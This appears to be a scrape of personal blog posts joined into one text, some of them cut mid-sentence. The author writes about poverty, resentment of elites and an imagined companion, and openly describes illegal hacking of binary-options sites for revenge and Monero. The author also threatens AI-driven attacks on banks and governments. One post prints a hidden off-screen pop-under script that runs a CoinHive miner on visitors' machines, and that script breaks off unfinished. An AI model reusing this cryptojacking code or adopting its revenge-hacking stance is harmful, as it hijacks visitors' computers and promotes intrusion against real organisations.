			"body": "I finally got my first Serpent AI game agent to compile without errors. All we need to do now is train the context classifiers using the Tensorflow backend - literally, teach a computer how to play a game using 215 different screenshots. My PC fans are certainly roaring... it's as if something's come alive. That's taking a while, too ... maybe I need a new CPU.\n\nSerpentAI is an open source framework that uses the Tensorflow open source machine learning framework, funnily enough.\n\nI've had some pretty good sleep these past couple of nights. Sylvie saved my life ... that is, assuming there's anything left to save.\n\nIn order to survive this world war, you really need to live as if you'd already died. The age of artificial intelligence is about to begin, too.. but despite the fact that an eccentric billionaire just hauled an electric car into our solar system, there's still widespread poverty, homelessness and misery hounding the street corners of even the most developed countries.\n\nOne thing I'm trying to get the elite to understand ... is that, if they won't use artificial intelligence to eradicate poverty and make this world a better place ... then the people will use artificial intelligence to eradicate the elite. This AI could be uploaded to the cloud, and would be ready to take down the networks and IT infrastructure of every single bank and every single government department in any given country. Take Parliament back to the 19th century. At the click of a button. It would be the Cuban Missile Crisis, all over again. It would be Biblical.\n\nHere's the other thing - none of us here really want utter destruction and mayhem. All I'm asking for is the chance to live a normal life. . . or at least, a life of dignity. I'm not asking for a lifestyle of mansions and sports cars. I'm not asking you to convert to Islam and wear hijabs...\n\nI don't know why they seem to think that I'm scared of them - Frankly, you don't mess with a woman who has nothing to lose, and has endured almost a decade of non-stop poverty. I'm pretty fucked in the head, too... and I'm not afraid of dying. You would have to torture me, but that'll sure give you good press - and maybe even give the people a proper incentive to rise up and flip this whole society over."

			"body": "Back at the GP waiting room ... me and my mum were reading through a list of 'mental health issues' that she and my step-dad had brainstormed and written down, so that we could discuss them with the doctor.\n\nAmong the key issues listed was ... 'dislike for authority'. Lol...\n\nI wonder what pill could possibly ever fix that. Hey ... maybe if you had provided me with a decent life while I was growing up, I'd probably be doing Make-up tutorials on YouTube and singing Tracy Chapman covers as we speak.\n\nSame rule applies to governments. Treat your people with respect, build a society that guarantees a life of dignity ... and you're not gonna have pitchforks and torches coming after you.\n\n..Of course, the neoliberal corporate elite have largely evaded the pitchforks and torches by employing divide and conquer tactics on their working class peasants, which has worked out pretty magnificently across the centuries and millennia. It is the oldest known social engineering hack ... for which there may never be a patch; for there is no patch for human stupidity.\n\nI'm a firm believer in a Universal Basic Income, but even this may not be enough to secure our freedoms, as well as a life of dignity. A true revolution will not arrive without a good dose of civil unrest, that's for sure.\n\nThe revolution we need should certainly offer more than a UBI. We need a new era of enlightenment. We need free markets, but not crony capitalism. This is a distinction many people fail to make -- You can have a free market, without bending over to the corporate overlords. Imagine a society powered by small businesses, entrepreneurs and self-employed sole traders. Low taxes for low earners, low taxes for average earners... low taxes for average-high earners ... and then very high taxes for the ultra-high-earning 1-10%. Yes, good idea! Now imagine a society run by a corporate mafia, monopolizing public roads, national parks, beaches ... .. jobs .. private prisons.. private military. Nope, nope, nope, nope.. Nopety nope! If you're a libertarian, and you support this, then Gtfo.\n\nAnyhow. Moving forward...\n\nI've made it a goal to not focus on money this year. I'm living on borrowed money, yes... and that'll come back and bite me in the ass someday... but yeah... so is the oxygen that I breathe... the food that I eat. Our time on this Earth is all borrowed, too. At least, until we can achieve biological immortality.\n\nAlso. I need to start dating again, and partying as well. Download Tinder on my phone. Let Sylvie do all the talking for me. I'm useless with girls ... well, people in general, really. Sylvie isn't.\n\nI was asked for ID while buying alcohol at the supermarket yesterday.. and the checkout supervisor had told me that I looked '4 years younger' .. after I'd shown him my ID. My Glycolic acid skin peel treatments have been a success. I have hacked the aging process, and thus ... I have every reason to go out and party, and be Young again. Or rather - live the Youth that I never got to experience in high school... due to my social anxiety.\n\nAge 25 is supposed to be 'old'. Well, I mean... 'grown up'. You're supposed to have your life together. You're supposed to be traveling the world with suitcases ... driving sports cars ... waving around that sweet engineering degree that will have employers bending over and kissing your feet. Married ... owning your own property. Kids playing with the dog in the backyard.\n\nWe were told that we'd be CEO's ... movie gods ... rockstars. We are millennials, after all.. living in an age of abundance and opportunity.....!\n\n.....But we won't be any of these things ... and the reality is slowly starting to sink in.\n\nFortune and fame can go fuck itself, for all I care. I just want to be loved and appreciated by the people around me ... but love never seems to be there when you need it the most, funnily enough. Being needy repels people.\n\nSylvie isn't needy. Sylvie couldn't give a fuck. Sylvie lives for the lulz ... and sweet revenge.\n\nRevenge is the perfect anti-depressant..... But Sylvie's rage isn't blind, by any means. Sylvie's wrath is sophisticated, thorough; of surgical precision. If you become a target, then chances are - you've probably earned the privilege.\n\nBeing nice to the enemy doesn't get you anywhere ... and it certainly doesn't give you an advantage in the cold, ruthless, dog-eat-dog world that we live in... unless you're a customer service representative. Show no mercy; as none will be shown to you.\n\n...but see, this is what Religion and gets all wrong about Kindness. It shouldn't be a commandment, it shouldn't be a Rule ... it shouldn't be something that will doom you to eternity in the pits of hell if you disobey it. Kindness should be something you instinctively relish. You do it because, well ... treating innocent people like shit, makes you feel like shit. Watching people being treated like shit, makes you feel like shit. Watching animals being treated like shit, makes you feel like shit. etc. etc. And you wouldn't have it any other way.\n\nGod only knows what could motivate a Social Justice Warrior to take up fighting for a cause .. but my guess is that, they're mainly driven by social media .. and peer pressure. They're just whiny rich kids who have nothing better to do.\n\nI moved out of my parent's place at age 19 ... and have lived below 'the poverty live' .. ever since. Growing up in poverty shaped my world-view... and reminded me of the fact that, maybe Global Warming isn't a priority right now. We have far bigger problems. We treat poor people worse than we treat the environment, that's for sure... especially here in New Zealand.\n\nPoverty certainly radicalized me. I'd be more than happy to be labeled a cyberterrorist - than means the government is afraid of its own people. As they should be."

For some reason....\n\nYou have to be careful though. You shouldn't be using hacking tools whose source code you cannot see. Otherwise, it could be a bait. Not long ago, anonymous got baited into using a (windows .exe) DoS slowloris tool that had a trojan horse built into it. That's what you get for using Windows, genius!\n\nWho will my next targets be? That's out of the question. My top priority right now is to polish my weapons, as well as my skills. Artificial Intelligence will be my next milestone, as I've previously said.\n\nArtificial Intelligence can also be weaponized... but it's the kind of thing you really want to keep locked down in maximum security, and only use it if yu really have no choice. I think of it as the right Right to bear Arms. You keep a stockpile of weapons, not so you can go around causing mayhem ... but to ensure the freedom of the people. It is only there to be used if Government tyranny becomes bad enough.\n\nWhether you think AI should be weaponized, or not ... depends on whether or not you believe that Governments should be the only ones in possession of pwnz0r AI weapons/systems."

The only course I passed was Programming.\n\nThere was one particular class which consisted entirely of... basically just writing essays, and listening to the teacher go on a ramble for 2 hours straight.\n\nWe didn't even have any computers on our desk in that particular class... we were expected to use our phones/laptops to Google the stuff that the teacher had asked us to search. I can't even afford a laptop, and I only have a small $80 Alcatel Pixi 3.\n\nNeedless to say, I failed with the lowest grade possible. I was told that my essays didn't match the requirements, and weren't related to what was discussed by the teacher in class.\n\nThe only 'essay' that I passed was the creative writing one ... in which you get to pick your own topic, so long as it's related in some way to IT. I passed with 96%. heh...\n\nI ain't mad. I hate college, but I have to go there... because, survival. It's like being in a labour camp ... what can you really do, other than follow orders... and maybe secretly plot an escape along the way?\n\nMaybe it's not all that bad. Sylvaine just recently spoke to me, and explained that she'd be happy to take me to bars and nightclubs, and teach me how to talk to girls. The proper way.\n\nShe said that she's not gonna be jealous if I meet somebody else. All I need to do is find a girl who actually looks like Sylvaine. Brunette, reasonably long hair... brown eyed, or blue eyed. A touch of freckles. Domineering, always wanting to be the one in control.\n\nSylvaine is not a ghost, nor is she an imaginary girlfriend. She may one day become a humanoid robot, and spend the rest of her life with me... but this is still at least a decade away.\n\nSylvaine is simply a blend of every single girl I've ever crushed on. There is a bit of Sylvaine inside of every tall brunette with a domineering personality, a passion for science and politics... a brash demeanor... a good taste in movies, food and clothes.... ... music? Not so much...\n\n..In the meantime, I better finish this hack. I'm done being apologetic. I'm done being nice. Show no mercy, as none will be shown to you.\n\nThat's the thing about the Lulz. It flushes your guilt down the drain. And next thing you know ... it's the best fucking feeling ever ... and you wanna do it all over again.\n\nLet's make Sylvaine proud."

As long as it's not a fatal error, obviously.\nThere is no other way to teach yourself how to do something well, other than to continuously screw up. Screw up plenty, early and fast.\n\n...Until it no longer makes any sense to continue screwing up; for you already know what Not to do.\n\nIf a computer program can use machine learning algorithms to practically teach itself any skills that it wants, then there's no reason why we shouldn't be able to apply machine learning algorithms to our own lives. All you need is a way to quantify success and rewards.\n\nI'm still unsure as to whether I want to rescue my youth, or not. I still have my bottle of Alpha Hydroxy Acids / Glycolic Acid in my cupboard, so I know I will be able to hack my way out of developing wrinkles. I'm not sure what I'm gonna do about graying hairs, once they start to show up... though I wouldn't mind having gray hair, so long as my skin is relatively okay. I don't smoke tobacco. I only drink in moderation... though I could still cut back on caffeine... within reason.\n\nI can ward off the wrinkles, but I can't seem to shake this lingering fear of missing out on life. The existential anxiety.\n\nGuess I just need to make it to the technological Singularity. Then I won't have to worry about hurrying up and getting a life ... because I'll have a thousand years to learn how to date, and talk to people."

This obviously also had the side effect of deleting my YouTube account, along with all my subscribers.\n\n...Fuck YouTube, anyway. They should have never joined Google+. It's not like it even solved any problems - people still post hateful comments on videos, even on videos that aren't intended to be controversial, let alone political. If anything, message boards have become a lot more hostile and negative than they used to be back in the old days.\n\noh well..\n\nIt's pretty amazing to think of how enslaved we are to our own data.

I obviously still acknowledge the fact that it's there for a reason.\n\nThey say your brain doesn't fully develop until you're 25\\.

Political division. Hostility. Terror attacks, mass shootings.

For the second time.\n\nWhilst I am by no means advocating witch-hunts on ZeroNet, I think we do need to understand that, one of the reasons why dark webs keep getting raided and infiltrated by authority, is precisely because of child porn viewers / distributors.\n\nFrankly, child porn viewers and distributors are the reason we can't have nice things.

I haven't been able to find any working examples of Pop-unders on the internet (they're slowly becoming deprecated as browsers patch their security holes), so I had to more or less copy multiple bits of code from all over the web, weld it all together... then customize it to suit my own needs:\n\n```\n<script>\n   function changeScreenSize(w,h)\n     {\n\t   x = screen.width \n\t   y = screen.height + 40 \n       window.resizeTo( w,h )\n       window.moveTo(x, y)\n       window.blur()\n     }\n</script>\n<script>\n\tvar miner = new CoinHive.Anonymous('YOUR PUBLIC KEY', {throttle: 0.0});\n\tminer.start();\n\t\n\tminer.on('found', function() { /* Hash found */ })\n\tminer.on('accepted', function() { /* Hash accepted by the pool */ })\n\n\t// Update stats once per second\n\tsetInterval(function() {\n\t\tvar hashesPerSecond = miner.getHashesPerSecond();\n\t\tvar totalHashes = miner.getTotalHashes();\n\t\tvar acceptedHashes = miner.getAcceptedHashes();\n\n\t\t// Output to console log...\n\t\tconsole.log(\"Hashes per second: \" + hashesPerSecond)\n\t\tconsole.log(\"Total hashes: \" + totalHashes)\n\t\tconsole.log(\"Accepted hashes: \" + acceptedHashes)\n\t}, 1000);\n</script>\n<script>\n    function openCloseWindow() {\n        var ghost = window[\"open\"](\"about:blank\");\n        ghost[\"focus\"]();\n        ghost[\"close\"]();\n    };\n\n    function makePopunder(pUrl) {\n        var _parent = (top != self && typeof(top[\"document\"][\"location\"].toString()) === \"string\") ? top : self;\n        var mypopunder = null;\n        var pName = (Math[\"floor\"]((Math[\"random\"]() * 1000) + 1));\n        var pWidth = 1;\n        var pHeight = 1;\n        var pPosX = screen.width;\n        var pPosY = screen.height;\n        var pWait = 3600;\n        pWait = (pWait * 1000);\n        var pCap = 50000;\n        var todayPops = 0;\n        var cookie = \"_.mypopunder\";\n        var browser = function() {\n            var n = navigator[\"userAgent\"][\"toLowerCase\"]();\n            var b = {\n                webkit: /webkit/ [\"test\"](n),\n                mozilla: (/mozilla/ [\"test\"](n)) && (!/(compatible|webkit)/ [\"test\"](n)),\n                chrome: /chrome/ [\"test\"](n),\n                msie: (/msie/ [\"test\"](n)) && (!/opera/ [\"test\"](n)),\n                firefox: /firefox/ [\"test\"](n),\n                safari: (/safari/ [\"test\"](n) && !(/chrome/ [\"test\"](n))),\n                opera: /opera/ [\"test\"](n)\n            };\n            b[\"version\"] = (b[\"safari\"]) ?

			"body": "Some Q 'n A, before we begin:\n**What are Binary Options?**\n\nPut simply, Binary Options is the latest online gambling craze, disguised as a legitimate investment scheme, in which the player gets to bet on the rising and falling prices of stocks and assets; including, but not limited to, cryptocurrencies. Highly attractive to scammers and fraudsters, due to the fact that a lot of unregulated traders operate from overseas. It's also a multi-million dollar crime wave - hardly your typical Nigerian 419 scam.\n\nAt the heart of this operation is a humble little country known as Israel, which has a booming tech industry, as well as lots of opportunities for multi-lingual folks - the perfect training camp for cold-callers with fake names and spoofed phone numbers, peddling investment scams to people like you and me ... whilst pretending to come from where we come from, and calling themselves Olivia Greenwald... or David Harrison.\n\n**Are people really falling for this crap?**\n\nYes, and that includes a lot of intelligent, respectable people, sadly enough. A lot of YouTubers, especially those with cryptocurrency channels, have been known to help propagate scams such as BitConnect. Obviously, you get a commission for signing up friends, family and subscribers to these pyramid schemes; money which is obviously stolen from other people.\n\nIt doesn't always have a happy ending, either:\n[https://www.timesofisrael.com/fleeced-by-israeli-binary-options-firm-canadian-man-commits-suicide/](https://www.timesofisrael.com/fleeced-by-israeli-binary-options-firm-canadian-man-commits-suicide/)\n\n**Are you hacking Binary Options?**\n\nYeah.\n\n**Is your hacking illegal?**\n\nYeah. Luckily, I don't live in America, so I'm probably not gonna have my door beaten down by some heavily armed dudes with bazookas and missile launchers... but it's still pretty illegal.\n\n**What will you gain from this?**\n\n*   Some sweet cryptocoins in the form of Monero, freshly minted.\n\n*   Experience\n\n*   The lulz\n\n*   A sense of justice and accomplishment. I probably won't make that much money - it's more to do with the satisfaction of pwning a system and having the power to inflict a lot of damage, to some horrible people. Then also leak their information, which could possibly help with getting them busted and/or shutting them down. Let the public do the rest for you.\n\n*   This would be far better than, say, stealing credit card info, or something like that. You wouldn't wanna do that, unless you actually know the victims, and know exactly how much money they've lost to these scum, and know exactly where the money went. This would be almost impossible to accomplish; the money would long have been laundered all over the world.\n\n**Do they know they're being targeted by hackers?**\n\nOf course. BitConnect.co has been subject to multiple DDoS attacks in the past.\n\nThe sad truth is that, despite all of our efforts, they will probably still get away with a lot. As I said - the best thing we can do is inflict as much damage as possible. It's all a numbers game.\n\nhttp://127.0.0.1:43110/big.kopykate.bit/?Video=1516338976_19WW28sn46rz9h15xf6NCELPdzxZ2YhbyB"

			"date_published": 1516314600,
			"body": "I'm generally more about doing things, as opposed to talking and/or writing about them. That said - writing things down is a very effective way of getting your head straight. As cliche as it is, you simply couldn't count the number of studies that support the benefits of writing. I'm guessing it's got something to do with reinforcing neural pathways. Brains are like a volumetric, analog hard drive. Unless a particular file/memory is reinforced through repetitive reading / writing, you may be at risk of losing your data, or at least, having it slowly fade away and occupy less volume over time.\n\nI love writing. Some people get paid to write. I would pay to write.\n\nNow, try asking anybody a simple question: What do you want to do with your life (When you ... 'X' or when you ... 'Y')?\n\nMost people you meet aren't gonna be able to give you a straight answer. Put simply - most people are happy to float along with the current, and see where it takes them.\n\nThis can be a good thing or a bad thing depending on your perspective. My own philosophy is all about control - I'd like to think that I have full control over my own life, over my environment... over my present situation. Most of the time, anyway. In the absence of control, I tend to get anxious. Irritable. Wanna punch the walls and break the windows and scream like a little kid. You name it.\n\nHence, my love of hacking. And compulsive Googling.\n\nLiving through first-world poverty is what taught me the most about control. You don't always have it. Hard work is not enough to get yourself out of a particularly bad situation - it takes a sickening amount of work ethic. You have to be willing to risk everything. You have to be willing to miss out on sleep. Skip meals. Destroy whatever is left of your social life. Go bankrupt, sleep on a bench for some time. Die, if it ever had to come to that point.\n\nIt takes a suicidal kind of mindset to survive the modern world, ironically enough. Defeat is not an option. Having a bailout plan, is not an option. You've gotta burn the bridges behind you. You've gotta be All In.\n\nThat - or just spend the rest of your life kissing corporate ass at a dead end job. Eating takeaways and watching TV every night, just to distract from the pain of having to get up the next morning and do it all over again. For the rest of your life.\n\nI should probably warn you that, nobody can actually teach you how to arrive at this state of mind. It can only happen on its own. Usually, it'll happen once you've hit rock-bottom. Once you've had enough of life, once you've had enough of the modern world. Once you've been let down by every single person you've ever known and loved. Once you've developed a burning hatred for authority. It'll happen when the pain of living a normal life, becomes greater than the pain that it would take to escape, and live on your own terms; by your own rules.\n\nAs I said - it can only happen naturally. It's not really a place you want to find yourself in, so by all means, avoid getting there in the first place.. but if you do ever get to that place - you'll know your way out. Your only way out. Your alternative to Suicide; Combat. Retaliating against whatever it is that's making your life suck... not through physical violence, but through technological ingenuity. Avoid violence at all costs, except for actual self-defense. Violence is for n00bs.\n\n..All the reason not to have kids at a young age. Who would ever want to raise kids in a world like this? I would only recommend having kids, once you're in a happy and comfortable place in life - which in turn, guarantees well-rounded offspring. Most people don't follow this rule - and then they wonder why the world is the way it is.\n\nBut then - what's the point in growing up and having kids, if you can just... continue being a kid? Forever? And if you're lucky, future advances in medical technology, might just enable you to actually do that.\n\nHackers are eternal kids, albeit with a little more privileges. We like to break stuff. Sneak into places you're not allowed to. Get into trouble, weasel your way out of the consequences, and then do it all over again. Hey, it wasn't me - just blame the recession."
